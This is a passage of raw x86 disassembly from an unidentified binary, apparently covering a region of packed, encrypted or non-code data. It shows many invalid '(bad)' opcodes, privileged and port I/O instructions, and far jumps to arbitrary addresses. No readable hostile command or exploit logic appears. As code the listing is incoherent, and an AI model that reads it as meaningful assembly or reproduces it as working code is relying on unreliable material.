  41941e:	les    ecx,FWORD PTR [ebp+ebp*8-0x29e34ac9]
  419425:	push   ss
  419426:	jl     0x419431
  419428:	add    DWORD PTR [eax],eax
  41942a:	pop    es
  41942b:	add    DWORD PTR [eax],eax
  41942d:	add    cl,dl
  41942f:	or     ch,BYTE PTR [ecx]
  419431:	gs jno 0x4193dd
  419434:	cmc    
  419435:	inc    ebx
  419436:	or     al,0xf3
  419438:	aam    0xda
  41943a:	xlat   BYTE PTR ds:[ebx]
  41943c:	xor    eax,0xb1b9e8e
  419441:	pop    es
  419442:	std    
  419443:	enter  0x1b49,0xd3
  419447:	adc    al,0xb1
  41944a:	(bad)  
  41944c:	xlat   BYTE PTR ds:[ebx]
  41944d:	or     al,0x9f
  41944f:	rcr    BYTE PTR [ebp+0x2fe16dad],1
  419455:	fs retf 0x9518
  419459:	xchg   ecx,eax
  41945a:	adc    edi,DWORD PTR [eax-0x7b093a3b]
  419460:	jmp    0x702c:0x44bd952b
  419467:	stos   DWORD PTR es:[edi],eax
  419468:	std    
  419469:	jo     0x41940b
  41946b:	test   ebp,eax
  41946d:	push   ss
  41946e:	pusha  
  41946f:	and    BYTE PTR [ebx],cl
  419471:	lea    esi,[esi]
  419473:	adc    eax,0xb920a6d2
  419478:	inc    eax
  419479:	dec    ebx
  41947a:	xchg   esp,eax
  41947b:	dec    edi
  41947c:	pop    esi
  41947d:	(bad)  
  41947f:	jmp    0x419457
  419481:	loop   0x4194ce
  419483:	mov    eax,ds:0x9dd3ee5d
  419488:	mov    dl,0x9
  41948a:	aaa    
  41948b:	sbb    BYTE PTR [eax],al
  41948d:	xlat   BYTE PTR ds:[ebx]
  41948e:	push   es
  41948f:	dec    esi
  419490:	call   0x819:0xd986a575
  419497:	sahf   
  419498:	add    bh,bl
  41949a:	hlt    
  41949b:	and    bl,BYTE PTR [esi+0x40ed234d]
  4194a1:	dec    ebx
  4194a2:	fild   WORD PTR [eax+edx*1+0xa2fbde0]
  4194a9:	in     al,0xa2
  4194ab:	dec    eax
  4194ac:	sub    edx,DWORD PTR [esi+esi*8-0x45]
  4194b0:	and    cl,BYTE PTR [edi-0x2c]
  4194b3:	pop    ss
  4194b4:	mov    bh,0xf3
  4194b6:	shl    BYTE PTR [edi-0x69],1
  4194b9:	add    al,0x41
  4194bb:	lea    esi,[edx-0xab1194e]
  4194c1:	or     dh,BYTE PTR [ecx]
  4194c3:	pop    edi
  4194c4:	loope  0x4194cb
  4194c6:	pop    edi
  4194c7:	ret    0xa743
  4194ca:	aad    0x3e
  4194cc:	and    BYTE PTR [edx-0x4d5ebce7],bh
  4194d2:	sbb    al,0xf4
  4194d4:	mov    al,0xf8
  4194d6:	shl    DWORD PTR [edi+0x78b08854],0xf8
  4194dd:	jp     0x4194b0
  4194df:	adc    al,BYTE PTR es:[edi+0x733f53d8]
  4194e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e7:	out    0xa7,eax
  4194e9:	jge    0x419567
  4194eb:	lahf   
  4194ec:	xor    eax,0x72fe94d2
  4194f1:	out    0x6c,eax
  4194f3:	cs pop edx
  4194f5:	ror    ebx,1
  4194f7:	mov    ebx,0x6f860104
  4194fc:	aaa    
  4194fd:	push   esi
  4194fe:	jle    0x419520
  419500:	in     al,0x30
  419502:	mov    bl,0x7f
  419505:	test   eax,0xbcf3a11e
  41950a:	sbb    ecx,DWORD PTR [eax-0x226fb5d7]
  419510:	push   0x71ea392d
  419515:	mov    ecx,0xf76911af
  41951a:	test   BYTE PTR [ebx],dh
  41951c:	mov    ebx,0xa0a5a3f5
  419521:	pop    bx
  419523:	push   esp
  419524:	ins    BYTE PTR es:[edi],dx
  419525:	inc    eax
  419526:	adc    DWORD PTR [eax+0x4f],0xffffffe6
  41952a:	test   eax,0x3356f54a
  41952f:	dec    esi
  419530:	or     DWORD PTR [ebx+0x6c],esp
  419533:	mov    ecx,0xde
	...
  419594:	add    BYTE PTR [eax],al
  419596:	scas   eax,DWORD PTR es:[edi]
  419597:	aam    0x8d
  419599:	(bad)  
  41959a:	(bad)  
  41959b:	jnp    0x41958c
  41959d:	fnsave [ebx-0xf]
  4195a0:	xchg   esi,eax
  4195a1:	test   BYTE PTR [ecx],0x15
  4195a4:	imul   edi,DWORD PTR [ecx+0x10a83],0x107
  4195ae:	mov    eax,ds:0x576fee41
  4195b3:	adc    eax,DWORD PTR [ebx-0x60f60992]
  4195b9:	jmp    esi
  4195bb:	pop    edx
  4195bc:	inc    ebx
  4195bd:	dec    esp
  4195be:	bound  eax,QWORD PTR [ecx*8+0x25fb01cc]
  4195c5:	(bad)
  4195c9:	call   0xea074fb7
  4195ce:	add    eax,0xccba5bb6
  4195d3:	in     eax,0x28
  4195d5:	push   esi
  4195d6:	adc    ecx,edx
  4195d8:	gs in  al,dx
  4195da:	daa    
  4195db:	push   ebp
  4195dc:	lds    edx,FWORD PTR [ebx+0x21]
  4195df:	sub    esp,eax
  4195e1:	xor    al,ch
  4195e3:	jle    0x419662
  4195e5:	sbb    eax,0x39f05965
  4195ea:	push   esi
  4195eb:	(bad)  
  4195ec:	in     eax,dx
  4195ed:	mov    dl,BYTE PTR [ebp-0x435dcadb]
  4195f3:	ror    al,0xa7
  4195f6:	cmp    al,0xf5
  4195f8:	push   0xf59c1d92
  4195fd:	xchg   ebp,eax
  4195fe:	adc    dl,BYTE PTR [edi+0x62]
  419601:	pop    ds
  419602:	loopne 0x419642
  419604:	dec    eax
  419605:	jle    0x4195db
  419607:	sub    eax,0x3fe204f6
  41960c:	aaa    
  41960d:	ret    
  41960e:	adc    ebx,esi
  419610:	xchg   edi,eax
  419611:	dec    ecx
  419612:	out    0x76,eax
  419614:	jmp    DWORD PTR [ebx]
  419616:	push   ss
  419617:	push   edx
  419618:	loopne 0x419636
  41961a:	cmp    ecx,DWORD PTR [ebp-0x28]
  41961d:	loop   0x419685
  41961f:	xlat   BYTE PTR ds:[ebx]
  419620:	js     0x4195d0
  419622:	idiv   DWORD PTR [esi+eax*4+0x72102988]
  419629:	ds inc eax
  41962b:	daa    
  41962c:	add    bh,ah
  41962e:	(bad)  
  41962f:	rcl    eax,cl
  419631:	add    DWORD PTR [edi-0x7a],edi
  419634:	dec    esp
  419635:	das    
  419636:	cmp    DWORD PTR [eax+0x74a383bb],ebx
  41963c:	outs   dx,BYTE PTR ds:[esi]
  41963d:	daa    
  41963e:	inc    ebp
  41963f:	inc    ecx
  419640:	out    dx,eax
  419641:	mov    ds:0x5d8bfa57,eax
  419646:	cmc    
  419647:	mov    edi,0xf28bc1fc
  41964c:	mov    al,ds:0xef9dfa1d
  419651:	push   cs
  419652:	ins    DWORD PTR es:[edi],dx
  419653:	stos   BYTE PTR es:[edi],al
  419654:	mov    ch,0xaa
  419656:	push   ds
  419657:	(bad)  
  419658:	and    al,0x58
  41965a:	push   ebp
  41965b:	ror    esi,cl
  41965d:	sbb    al,0xc4
  41965f:	or     ecx,ecx
  419661:	int3   
  419662:	push   ebp
  419663:	xchg   ecx,ebp
  419665:	or     dh,cl
  419667:	enter  0xc9f1,0x0
  41966b:	sbb    ecx,esi
  41966d:	fld    TBYTE PTR ss:[ecx*2+0x41320e4]
  419675:	int3   
  419676:	fisubr WORD PTR [eax+0x59]
  419679:	sub    eax,0xd3f2919a
  41967e:	mov    esp,0x88663894
  419683:	mov    al,ss:0xd619ebcc
  419689:	outs   dx,DWORD PTR ds:[esi]
  41968a:	and    DWORD PTR [esi-0x2b6a5ffa],0x6ff87451
  419694:	xor    BYTE PTR [esi],ch
  419696:	aam    0x22
  419698:	pop    ecx
  419699:	mov    cl,ah
  41969b:	(bad)  
  41969c:	adc    dh,bh
  41969e:	js     0x41971b
  4196a0:	inc    esi
  4196a1:	call   0x5f9716e7
  4196a6:	ins    BYTE PTR es:[edi],dx
  4196a7:	(bad)  [edi]
  4196a9:	fcom   DWORD PTR [ecx-0x4ee65a0b]
  4196af:	ja     0x41969c
  4196b1:	int3   
  4196b2:	jp     0x41965d
  4196b4:	fadd   DWORD PTR [eax]
	...
  419716:	mov    bl,0x3f
  419718:	jno    0x41977f
  41971a:	std    
  41971b:	outs   dx,DWORD PTR ds:[esi]
  41971c:	mov    bh,0xff
  41971e:	inc    ebp
  41971f:	loop   0x419766
  419721:	dec    esp
  419722:	nop
  419723:	xor    al,0x9a
  419725:	data16 mov cl,BYTE PTR [ebx]
  419728:	add    DWORD PTR [eax],eax
  41972a:	pop    es
  41972b:	add    DWORD PTR [eax],eax
  41972d:	add    BYTE PTR [ecx],al
  41972f:	sub    DWORD PTR [edi],ecx
  419731:	or     esp,edi
  419733:	add    BYTE PTR [esi+edi*2],ch
  419736:	imul   ebp,DWORD PTR [ecx+ebx*2-0x53cd298b],0x1c
  41973e:	mov    ecx,edi
  419740:	mov    ss,WORD PTR [ecx+0x6568e8a1]
  419746:	cmp    BYTE PTR [esi-0x43375bb1],bl
  41974c:	cld    
  41974d:	mov    ah,bl
  41974f:	dec    esp
  419750:	ja     0x4197c8
  419752:	ja     0x4197cc
  419754:	mov    DWORD PTR [ebp-0x52],0xcc67b04a
  41975b:	(bad)  
  41975c:	cmp    ebx,esi
  41975e:	into   
  41975f:	and    DWORD PTR [edi],0xecb9bbc4
  419765:	arpl   WORD PTR [ecx+0x5],bx
  419768:	jno    0x4197cd
  41976a:	leave  
  41976b:	iret   
  41976c:	sbb    eax,0x3926ef61
  419771:	in     eax,0x91
  419773:	cdq    
  419774:	cld    
  419775:	mov    bh,0x1c
  419777:	jmp    0x41977c
  419779:	dec    edi
  41977a:	das    
  41977b:	inc    edx
  41977c:	sbb    BYTE PTR ds:0xd446d6ff,ah
  419782:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419783:	lods   eax,DWORD PTR ds:[esi]
  419784:	dec    ebp
  419785:	(bad)  
  419786:	fld    QWORD PTR [ecx]
  419788:	out    0x3d,al
  41978a:	cmc    
  41978b:	mov    ch,0xe3
  41978d:	call   0x5c9dcc9d
  419792:	ins    DWORD PTR es:[edi],dx
  419793:	cli    
  419794:	sub    al,0xdd
  419796:	retf   0x2f14
  419799:	leave  
  41979a:	xor    DWORD PTR [ebp+0x40],ecx
  41979d:	adc    al,0xfc
  41979f:	cli    
  4197a0:	push   edx
  4197a1:	ror    edi,1
  4197a3:	add    al,0x7a
  4197a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4197a6:	push   0xee6c7583
  4197ab:	popf   
  4197ac:	arpl   WORD PTR [eax+0x73],si
  4197af:	cmp    eax,0xf86e292b
  4197b4:	ds pop ds
  4197b6:	push   edi
  4197b7:	or     BYTE PTR [edx],dh
  4197b9:	mov    ah,0x15
  4197bb:	pop    ss
  4197bc:	or     ebp,DWORD PTR [ebx-0x6fd0e269]
  4197c2:	iret   
  4197c3:	push   esi
  4197c4:	fldcw  WORD PTR [edx]
  4197c6:	mov    al,ds:0x85d5c4d6
  4197cc:	xor    esp,DWORD PTR [ecx*8+0x6ebb92b9]
  4197d3:	add    bh,BYTE PTR [ebx+ebx*1+0x5b]
  4197d7:	xchg   BYTE PTR [esi+edx*8-0x69bd8d34],bl
  4197de:	adc    eax,0x1aee31b3
  4197e3:	es jge 0x419812
  4197e6:	(bad)  
  4197e7:	outs   dx,BYTE PTR ds:[esi]
  4197e8:	push   cs
  4197e9:	popf   
  4197ea:	jo     0x41982a
  4197ec:	mov    DWORD PTR [ecx-0x20],ecx
  4197ef:	adc    eax,0x740db518
  4197f4:	aad    0xc9
  4197f6:	mov    ch,0x68
  4197f8:	shr    BYTE PTR [edi+0x79a69e06],1
  4197fe:	fsubr  DWORD PTR [edi-0x8]
  419801:	and    DWORD PTR [ebp-0x13],edi
  419804:	loop   0x4197f4
  419806:	mov    cs,WORD PTR [esi]
  419808:	test   BYTE PTR [esi+0x52],bl
  41980b:	retf   
  41980c:	aaa    
  41980d:	xor    al,0xa4
  41980f:	or     eax,DWORD PTR [ebp-0x4a]
  419812:	xchg   ebx,eax
  419813:	cdq    
  419814:	addr16 mov ebp,0x5854704f
  41981a:	mov    DWORD PTR [esi-0x7d7c7d3],ecx
  419820:	push   edi
  419821:	mov    ah,0x38
  419823:	mov    ebp,DWORD PTR [ebx]
  419825:	mov    ch,0x30
  419827:	fs stos BYTE PTR es:[edi],al
  419829:	mov    eax,ds:0xccb06f93
  41982e:	mov    esi,DWORD PTR [ebp+ecx*1+0x2a]
  419832:	push   0x2407
	...
  419893:	add    BYTE PTR [eax],al
  419895:	add    BYTE PTR [edx-0x201eb8e7],al
  41989b:	jmp    DWORD PTR [esi-0x4a285f85]
  4198a1:	ficomp DWORD PTR [eax]
  4198a3:	shr    DWORD PTR [edx],1
  4198a5:	leave  
  4198a6:	xchg   ecx,eax
  4198a7:	or     al,0x1
  4198a9:	add    BYTE PTR [edi],al
  4198ab:	add    DWORD PTR [eax],eax
  4198ad:	add    BYTE PTR [ebx-0x23],bh
  4198b0:	fsubr  QWORD PTR [edx-0x42]
  4198b3:	(bad)  
  4198b4:	pop    ss
  4198b5:	pop    DWORD PTR [edi]
  4198b7:	dec    esi
  4198b8:	jp     0x4198cb
  4198ba:	xchg   ebx,eax
  4198bb:	mov    WORD PTR [ebp+0x37],es
  4198be:	or     esi,DWORD PTR [edi-0x47]
  4198c1:	push   0x57
  4198c3:	cmp    dl,dl
  4198c5:	cmp    al,BYTE PTR [ebp+0x2c]
  4198c8:	push   0x377f6c98
  4198cd:	(bad)  
  4198ce:	out    0xae,al
  4198d0:	mov    ds:0x85304b19,eax
  4198d5:	cwde   
  4198d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198d7:	dec    ecx
  4198d8:	jae    0x41986c
  4198da:	cli    
  4198db:	xchg   edi,eax
  4198dc:	push   ebx
  4198dd:	call   0xe715:0xda48da9
  4198e4:	mov    esp,0x8d733e03
  4198e9:	xchg   edi,eax
  4198ea:	inc    edi
  4198eb:	cmp    ebx,DWORD PTR [eax+0x51]
  4198ee:	std    
  4198ef:	dec    edx
  4198f0:	push   ds
  4198f1:	dec    esi
  4198f2:	cdq    
  4198f3:	loop   0x4198db
  4198f5:	dec    esi
  4198f6:	(bad)  
  4198f8:	es push 0x50f4aaf7
  4198fe:	dec    ecx
  4198ff:	loopne 0x41994f
  419901:	les    esi,FWORD PTR [edi]
  419903:	sbb    al,0xd7
  419905:	(bad)  
  419906:	mov    bl,0x58
  419908:	lea    esi,[esi+0xa]
  41990b:	adc    dl,BYTE PTR [edi+0x634cdb3]
  419911:	sub    eax,0x703782e7
  419916:	outs   dx,DWORD PTR ds:[esi]
  419917:	repz call DWORD PTR [ecx+0x73d19cf9]
  41991e:	fild   DWORD PTR [eax-0x44]
  419921:	add    DWORD PTR [eax+eiz*2-0x40],ebp
  419925:	mov    esi,0xc2bee9c
  41992a:	pop    esi
  41992b:	stos   BYTE PTR es:[edi],al
  41992c:	nop
  41992d:	loop   0x4198f8
  41992f:	xchg   ebp,eax
  419930:	aam    0x53
  419932:	ficomp DWORD PTR [ebx]
  419934:	in     al,0xa9
  419936:	aas    
  419937:	inc    edi
  419938:	mov    BYTE PTR [edi],bl
  41993a:	iret   
  41993b:	loopne 0x41994d
  41993d:	retf   
  41993e:	repnz in al,0x39
  419941:	xor    bl,BYTE PTR [eax-0x497cab1b]
  419947:	stos   DWORD PTR es:[edi],eax
  419948:	inc    ebp
  419949:	jle    0x4199a3
  41994b:	rol    DWORD PTR ds:0x20b0e802,0x63
  419952:	daa    
  419953:	sub    BYTE PTR [edx+0x1b],0x2
  419957:	mov    esi,0xba1e0844
  41995c:	lds    esi,FWORD PTR ds:0x13b762aa
  419962:	sbb    DWORD PTR [ecx+0x4107241f],ebp
  419968:	test   eax,0xcaa28b27
  41996d:	(bad)  
  41996e:	in     eax,0xdf
  419970:	push   ss
  419971:	jle    0x419946
  419973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419974:	lahf   
  419975:	xor    ebp,ebp
  419977:	inc    edx
  419978:	xor    ah,BYTE PTR [ecx]
  41997a:	int3   
  41997b:	push   ebp
  41997c:	test   DWORD PTR [ebx],edi
  41997e:	scas   eax,DWORD PTR es:[edi]
  41997f:	call   FWORD PTR ds:0x908ffc8f
  419985:	rcr    cl,0xe8
  419988:	sbb    BYTE PTR [esi-0x13e6ba0b],0xea
  41998f:	push   eax
  419990:	dec    ebp
  419991:	cld    
  419992:	xchg   eax,esp
  419994:	xchg   ah,ah
  419996:	xchg   esp,eax
  419997:	test   BYTE PTR [ebx+0x4b],bh
  41999a:	pusha  
  41999b:	mov    ebx,0xe83f4ec8
  4199a0:	call   0xa239b82a
  4199a5:	pop    esp
  4199a6:	jmp    0xdb29d0cf
  4199ab:	sub    dh,BYTE PTR [ebx]
  4199ad:	(bad)  
  4199ae:	outs   dx,DWORD PTR ds:[esi]
  4199af:	inc    esp
  4199b0:	(bad)  
  4199b1:	scas   al,BYTE PTR es:[edi]
  4199b2:	fs ins DWORD PTR es:[edi],dx
  4199b4:	inc    edx
	...
  419a15:	add    BYTE PTR [ebx],dh
  419a17:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a1d:	neg    DWORD PTR [ecx+0x16]
  419a20:	mov    eax,ds:0xecf93809
  419a25:	(bad)  
  419a26:	cwde   
  419a27:	or     eax,0x1070001
  419a2c:	add    BYTE PTR [eax],al
  419a2e:	sbb    eax,0xf286d3df
  419a33:	iret   
  419a34:	inc    ecx
  419a35:	call   0x292b8b3e
  419a3a:	fld    TBYTE PTR [ecx]
  419a3c:	int3   
  419a3d:	xor    DWORD PTR [ebx+ebx*4],edx
  419a40:	jo     0x419a25
  419a42:	inc    ebx
  419a43:	aam    0xe1
  419a45:	adc    eax,0xeeb4ec03
  419a4a:	jo     0x419ac8
  419a4c:	xor    ebp,DWORD PTR [ebp-0x21]
  419a4f:	jge    0x419a69
  419a51:	cmp    bh,dh
  419a53:	lea    esi,[edx]
  419a55:	(bad)  
  419a57:	stc    
  419a58:	pop    ss
  419a59:	(bad)  [esi-0x7c63176]
  419a5f:	adc    al,0xbf
  419a61:	stc    
  419a62:	cmp    DWORD PTR [edx],edi
  419a64:	xchg   ebx,eax
  419a65:	es gs retf 0x34d9
  419a6a:	loope  0x419a95
  419a6c:	mov    dh,0xbe
  419a6e:	pop    ebx
  419a6f:	cmc    
  419a70:	fdiv   DWORD PTR [ecx]
  419a72:	dec    esp
  419a73:	adc    dh,ch
  419a75:	mov    edx,0xb8dd4d51
  419a7a:	addr16 mov dh,0x4
  419a7d:	cmp    al,0xf3
  419a7f:	jmp    FWORD PTR [ebp-0x65291409]
  419a85:	jne    0x419aee
  419a87:	fsub   st,st(3)
  419a89:	add    edx,DWORD PTR [eax]
  419a8b:	aad    0x8b
  419a8d:	popf   
  419a8e:	pop    ebx
  419a8f:	inc    esi
  419a90:	loopne 0x419a94
  419a92:	cs inc ecx
  419a94:	sbb    esp,DWORD PTR [eax+eiz*8]
  419a97:	mov    bl,0x3d
  419a99:	sbb    esi,DWORD PTR [ecx+eiz*4]
  419a9c:	std    
  419a9d:	dec    edx
  419a9e:	xchg   ecx,eax
  419a9f:	pop    edx
  419aa0:	mov    dl,BYTE PTR [ecx+edi*1-0x5d]
  419aa4:	add    eax,0x8c32a1c7
  419aa9:	dec    esi
  419aaa:	sub    eax,0xd414677
  419aaf:	add    ah,BYTE PTR [eax+esi*1-0x125b6287]
  419ab6:	mov    esp,0x3b59340d
  419abb:	cmc    
  419abc:	sbb    al,0xa9
  419abe:	sbb    ah,ah
  419ac0:	or     eax,0x72f3f18a
  419ac5:	iret   
  419ac6:	jae    0x419ae0
  419ac8:	xchg   ebp,eax
  419ac9:	xor    esi,DWORD PTR [edi-0x5a0205e4]
  419acf:	add    BYTE PTR [ebx-0x31],0xda
  419ad3:	xchg   esp,eax
  419ad4:	test   eax,0x115e27c3
  419ad9:	mov    al,ds:0x95d5f50f
  419ade:	push   edi
  419adf:	fdiv   DWORD PTR [edx]
  419ae1:	push   ss
  419ae2:	sbb    al,0x4d
  419ae4:	ins    DWORD PTR es:[edi],dx
  419ae5:	mov    dh,0x91
  419ae7:	sbb    al,0x1e
  419ae9:	stos   DWORD PTR es:[edi],eax
  419aea:	retf   0x8b6d
  419aed:	jbe    0x419aa3
  419aef:	cdq    
  419af0:	out    0x86,al
  419af2:	mov    eax,0xa48d8171
  419af7:	imul   ecx,DWORD PTR [ecx-0x8d62767],0x5eb8692d
  419b01:	sar    BYTE PTR [edx+ecx*4],1
  419b04:	outs   dx,BYTE PTR ds:[esi]
  419b05:	and    eax,0x249aca36
  419b0a:	mov    ds:0xfbbbe3f5,eax
  419b0f:	inc    edx
  419b10:	fldln2 
  419b12:	ins    DWORD PTR es:[edi],dx
  419b13:	push   ds
  419b14:	xchg   edx,eax
  419b15:	xchg   BYTE PTR [ecx+0x4f],bh
  419b18:	jmp    0x20a52e22
  419b1d:	inc    esp
  419b1e:	and    eax,0x39ac18f8
  419b23:	and    cl,bl
  419b25:	mov    WORD PTR [ebp+0x5ff3727],gs
  419b2b:	cmp    BYTE PTR [eax-0x42],0xd3
  419b2f:	push   ecx
  419b30:	mov    ah,0xb4
  419b32:	dec    dx
  419b34:	push   edx
	...
  419b95:	add    BYTE PTR [edx-0x3c],cl
  419b98:	cli    
  419b99:	inc    edi
  419b9a:	(bad)  
  419b9b:	jg     0x419b9c
  419b9d:	int    0xb7
  419b9f:	cs aam 0x47
  419ba2:	cwde   
  419ba3:	ins    BYTE PTR es:[edi],dx
  419ba4:	mov    ebx,0x10e9f5d
  419ba9:	add    BYTE PTR [edi],al
  419bab:	add    DWORD PTR [eax],eax
  419bad:	add    BYTE PTR [esi],bh
  419baf:	jmp    0x3533:0x65314748
  419bb6:	mov    dh,0x5f
  419bb8:	fistp  DWORD PTR [edi-0x323626f8]
  419bbe:	dec    esi
  419bbf:	retfw  0x4bd9
  419bc3:	pop    edx
  419bc4:	dec    ebx
  419bc5:	ror    dh,1
  419bc7:	jmp    0x491a:0x5fe10bb3
  419bce:	fcomi  st,st(0)
  419bd0:	pop    ebx
  419bd1:	mov    dl,0xcb
  419bd3:	adc    edx,ebp
  419bd5:	cmp    eax,0xf7a9d0cd
  419bda:	popf   
  419bdb:	jg     0x419b9f
  419bdd:	ficomp DWORD PTR [ebx]
  419bdf:	arpl   WORD PTR [edx],ax
  419be1:	push   ss
  419be2:	mov    al,0x5f
  419be4:	ret    
  419be5:	fcmovbe st,st(4)
  419be7:	pop    ebp
  419be8:	bnd ja 0x419b95
  419beb:	pop    ecx
  419bec:	loope  0x419b98
  419bee:	and    edi,DWORD PTR [ebx+0x31450bea]
  419bf4:	sub    eax,0x683f9ea6
  419bf9:	jl     0x419bfd
  419bfb:	dec    eax
  419bfc:	addr16 jb 0x419c25
  419bff:	inc    esi
  419c00:	mov    ch,bl
  419c02:	cwde   
  419c03:	into   
  419c04:	in     eax,dx
  419c05:	inc    esi
  419c06:	call   0xca8a:0x39dce0b9
  419c0d:	scas   al,BYTE PTR es:[edi]
  419c0e:	jge    0x419c78
  419c10:	dec    ecx
  419c11:	cld    
  419c12:	mov    esi,0x845682c
  419c17:	test   eax,0x6c92225c
  419c1c:	sbb    DWORD PTR [ebx],ecx
  419c1e:	or     BYTE PTR [edi-0x70951592],0xa7
  419c25:	adc    ecx,DWORD PTR [ecx+0x14]
  419c28:	sub    ebx,DWORD PTR [edi+0x50]
  419c2b:	and    DWORD PTR [eax-0x548d2d15],ebx
  419c31:	xchg   edi,eax
  419c32:	mov    ebx,0xc2a94891
  419c37:	adc    al,ch
  419c39:	les    edi,FWORD PTR [edx+edx*8-0x3a]
  419c3d:	or     ah,dl
  419c3f:	or     eax,DWORD PTR [ebx]
  419c41:	lahf   
  419c42:	bound  ecx,QWORD PTR [ecx]
  419c44:	xchg   esp,eax
  419c45:	add    eax,0x57086f7a
  419c4a:	or     esi,DWORD PTR [ebx-0x6c]
  419c4d:	adc    ah,BYTE PTR ds:0x34b0240e
  419c53:	mov    ebp,0x22b511b0
  419c58:	scas   al,BYTE PTR es:[edi]
  419c59:	push   ebp
  419c5a:	(bad)  
  419c5c:	shl    BYTE PTR [ebx],0x3a
  419c5f:	adc    edi,DWORD PTR [esi]
  419c61:	inc    eax
  419c62:	icebp  
  419c63:	adc    DWORD PTR [edi-0x4387f5a0],ebx
  419c69:	inc    edi
  419c6a:	jle    0x419c66
  419c6c:	(bad)  
  419c6d:	cs leave 
  419c6f:	pop    esi
  419c70:	add    bl,BYTE PTR [ebx]
  419c72:	push   0xb7a905c9
  419c77:	cs jbe 0x419c06
  419c7a:	popf   
  419c7b:	or     esp,ebp
  419c7d:	jbe    0x419c01
  419c7f:	ja     0x419c55
  419c81:	push   esi
  419c82:	lods   eax,DWORD PTR ds:[esi]
  419c83:	test   eax,0x4b77684e
  419c88:	cmp    ah,BYTE PTR [esi+ebp*2+0x0]
  419c8c:	mov    ds:0xc1ab0995,al
  419c91:	lods   al,BYTE PTR ds:[esi]
  419c92:	push   esi
  419c93:	popa   
  419c94:	push   esi
  419c95:	mov    bh,0x53
  419c97:	mov    cl,0x32
  419c99:	xor    al,BYTE PTR [edi+0xc]
  419c9c:	nop
  419c9d:	add    eax,0x65dc4b08
  419ca2:	push   ecx
  419ca3:	in     al,dx
  419ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ca5:	bound  edx,QWORD PTR [eax+0x1b046d87]
  419cab:	sub    esp,edx
  419cad:	adc    BYTE PTR ds:0xd8bc48cd,cl
  419cb3:	sbb    eax,DWORD PTR cs:[eax]
	...
  419d16:	lock xchg edi,eax
  419d18:	std    
  419d19:	cmp    al,0xff
  419d1b:	jle    0x419d0e
  419d1d:	fistp  WORD PTR [eax]
  419d1f:	push   0xf8999c45
  419d24:	xor    esp,DWORD PTR [ebp-0x5a]
  419d27:	sgdtd  [eax]
  419d2a:	pop    es
  419d2b:	add    DWORD PTR [eax],eax
  419d2d:	add    bh,bl
  419d2f:	mov    ecx,0xfb633e86
  419d34:	cli    
  419d35:	jne    0x419ce8
  419d37:	dec    edi
  419d38:	test   eax,0xd1eb7f20
  419d3d:	adc    esp,DWORD PTR [ecx+0x67]
  419d40:	inc    ecx
  419d41:	sub    esp,esp
  419d43:	mov    ah,0x79
  419d45:	imul   esp,DWORD PTR [eax+0x4902f270],0xe07ad3c0
  419d4f:	aad    0xa3
  419d51:	idiv   BYTE PTR [ebx-0x37]
  419d54:	xchg   edi,eax
  419d55:	lods   eax,DWORD PTR ds:[esi]
  419d56:	inc    edx
  419d57:	push   es
  419d58:	call   0x65ce:0xb03c9b7
  419d5f:	push   ecx
  419d60:	mov    cl,0x91
  419d62:	xor    ecx,DWORD PTR [ecx-0xc]
  419d65:	enter  0x7cd6,0x16
  419d69:	xchg   BYTE PTR [eax+0x5deab941],bl
  419d6f:	popa   
  419d70:	cli    
  419d71:	cld    
  419d72:	shl    DWORD PTR [esi+0x296ccdc3],cl
  419d78:	jmp    0x419d7f
  419d7a:	jae    0x419df8
  419d7c:	adc    eax,esp
  419d7e:	cli    
  419d7f:	add    esp,DWORD PTR [edi]
  419d81:	loop   0x419df3
  419d83:	xchg   DWORD PTR ds:0xcc299749,eax
  419d89:	dec    esp
  419d8a:	fwait
  419d8b:	daa    
  419d8c:	mov    ebp,0xa58248bb
  419d91:	mov    dh,0x2d
  419d93:	or     BYTE PTR [eax-0x75],dh
  419d96:	jb     0x419d9d
  419d98:	pop    ebp
  419d99:	cli    
  419d9a:	rcl    BYTE PTR [ebx+0x7],cl
  419d9d:	mov    bl,0xf
  419d9f:	aad    0x85
  419da1:	sahf   
  419da2:	repz sbb DWORD PTR [eax],esp
  419da5:	cli    
  419da6:	outs   dx,DWORD PTR ds:[esi]
  419da7:	ret    0xe9ec
  419daa:	cld    
  419dab:	jl     0x419d56
  419dad:	cmp    eax,0xa7d7fdb8
  419db2:	les    esp,FWORD PTR [ecx-0x40]
  419db5:	and    edi,ebx
  419db7:	imul   ecx,DWORD PTR [ebp-0x59012c73],0x56
  419dbe:	ins    BYTE PTR es:[edi],dx
  419dbf:	push   esi
  419dc0:	dec    esi
  419dc1:	cmp    al,0xba
  419dc3:	cmp    esi,DWORD PTR [ecx+0x785737cf]
  419dc9:	retf   
  419dca:	inc    eax
  419dcb:	ret    
  419dcc:	adc    ebx,edi
  419dce:	push   esp
  419dcf:	inc    ebp
  419dd0:	xor    BYTE PTR [edx+0x3da6552d],bh
  419dd6:	mov    eax,DWORD PTR ds:0x14316659
  419ddc:	dec    edx
  419ddd:	pop    esi
  419dde:	mov    eax,ds
  419de0:	test   eax,0xff104f91
  419de5:	mov    ebp,0xa53b77f7
  419dea:	mov    ds:0x16d5fc5d,eax
  419def:	retf   0xc832
  419df2:	jl     0x419de4
  419df4:	push   0xffffffd1
  419df6:	dec    edi
  419df7:	int    0xfa
  419df9:	pop    es
  419dfa:	jle    0x419de0
  419dfc:	pop    esi
  419dfd:	mul    BYTE PTR [ecx+0x7f]
  419e00:	push   ecx
  419e01:	jo     0x419d9c
  419e03:	push   edx
  419e04:	push   ebx
  419e05:	outs   dx,BYTE PTR ds:[esi]
  419e06:	pop    ebx
  419e07:	xchg   edi,eax
  419e08:	retf   0xf695
  419e0b:	icebp  
  419e0c:	or     DWORD PTR [eax+ebx*8],edx
  419e0f:	mov    eax,ebp
  419e11:	or     al,0xf8
  419e13:	mov    ds,ecx
  419e15:	enter  0x22a3,0x26
  419e19:	into   
  419e1a:	rcr    BYTE PTR [esi],0x16
  419e1d:	mov    ds:0x6a11d627,al
  419e22:	loope  0x419e8c
  419e24:	sub    ebx,DWORD PTR [ebx-0x26c3c49]
  419e2a:	inc    esi
  419e2b:	retf   
  419e2c:	jmp    0x5874:0x2a2f6a4
